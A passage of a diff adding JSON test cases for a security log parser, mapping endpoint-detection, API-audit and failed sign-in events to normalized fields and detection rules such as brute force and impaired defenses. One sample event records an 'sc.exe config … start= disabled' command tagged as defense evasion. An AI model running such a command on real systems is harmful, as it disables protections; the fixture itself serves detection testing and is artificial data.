+          "Hostname": "ws-example-15",
+          "LocalIP": "192.0.2.15",
+          "MACAddress": "00-00-5e-00-53-0f",
+          "UserName": "example.admin",
+          "PlatformName": "Windows",
+          "FileName": "sc.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "\"C:\\Windows\\System32\\sc.exe\" config ExampleService start= disabled",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Defense Evasion",
+          "Technique": "Impair Defenses",
+          "Objective": "Follow Through",
+          "PatternId": 10015,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Example disposition: prevention policy disabled.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": true,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4015,
+          "ParentProcessId": 3015,
+          "ProcessStartTime": 1790000115,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/0000000000000000000000000000000f"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-15",
+        "origin.ip": "192.0.2.15",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.admin",
+        "log.eventCommandLine": "\"C:\\Windows\\System32\\sc.exe\" config ExampleService start= disabled"
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml",
+        "security_defenses_impaired_or_policy_disabled.yml"
+      ]
+    },
+    {
+      "name": "api-trace-service-message",
+      "purpose": "An API audit record: trace_id, ServiceName and Message are each renamed once.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 201,
+          "eventType": "APIActivityAuditEvent",
+          "eventCreationTime": 1790000201000,
+          "version": "1.0"
+        },
+        "event": {
+          "UserId": "",
+          "OperationName": "example_operation",
+          "ServiceName": "example_service",
+          "Success": true,
+          "UTCTimestamp": 1790000201,
+          "Attributes": {
+            "APIClientID": "00000000000000000000000000000000",
+            "request_method": "GET",
+            "request_path": "/example/entities/v1",
+            "status_code": "200",
+            "trace_id": "00000000-0000-4000-8000-000000000201"
+          },
+          "Message": "Example message",
+          "Source": "example_source",
+          "SourceIp": "203.0.113.30"
+        }
+      },
+      "expected": {
+        "log.eventAttributesTraceID": "00000000-0000-4000-8000-000000000201",
+        "log.eventServiceName": "example_service",
+        "log.eventMessage": "Example message",
+        "origin.ip": "203.0.113.30"
+      },
+      "absent": [
+        "log.event.Attributes.trace_id",
+        "log.event.ServiceName",
+        "log.event.Message"
+      ],
+      "rules": []
+    },
+    {
+      "name": "sign-in-failure-source-address",
+      "purpose": "A failed sign-in record that carries its address as SourceIp.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 202,
+          "eventType": "AuthActivityAuditEvent",
+          "eventCreationTime": 1790000202000,
+          "version": "1.0"
+        },
+        "event": {
+          "UserId": "example.user@example.com",
+          "OperationName": "userAuthenticate",
+          "ServiceName": "example_service",
+          "Success": false,
+          "UTCTimestamp": 1790000202,
+          "Message": "Example sign-in failure",
+          "Source": "",
+          "SourceIp": "198.51.100.40"
+        }
+      },
+      "expected": {
+        "origin.ip": "198.51.100.40",
+        "log.eventSuccess": false,
+        "log.eventServiceName": "example_service",
+        "log.eventMessage": "Example sign-in failure"
+      },
+      "absent": [
+        "log.event.ServiceName",
+        "log.event.Message"
+      ],
+      "rules": [
+        "multiple_authentication_failures_(possible_brute_force_attack).yml"
+      ]
+    },
+    {
+      "name": "sign-in-failure-no-address",
+      "purpose": "A failed sign-in record without an address cannot start the brute-force check.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 203,
+          "eventType": "AuthActivityAuditEvent",
+          "eventCreationTime": 1790000203000,
+          "version": "1.0"
+        },
+        "event": {
+          "UserId": "example.user@example.com",
+          "OperationName": "userAuthenticate",
+          "ServiceName": "example_service",
+          "Success": false,
+          "UTCTimestamp": 1790000203,
+          "Message": "Example sign-in failure",
+          "Source": ""
+        }
+      },
+      "expected": {
+        "log.eventSuccess": false
+      },
+      "absent": [
+        "origin.ip",
+        "log.event.ServiceName",
+        "log.event.Message"
+      ],
+      "rules": []
+    }
+  ]
+}
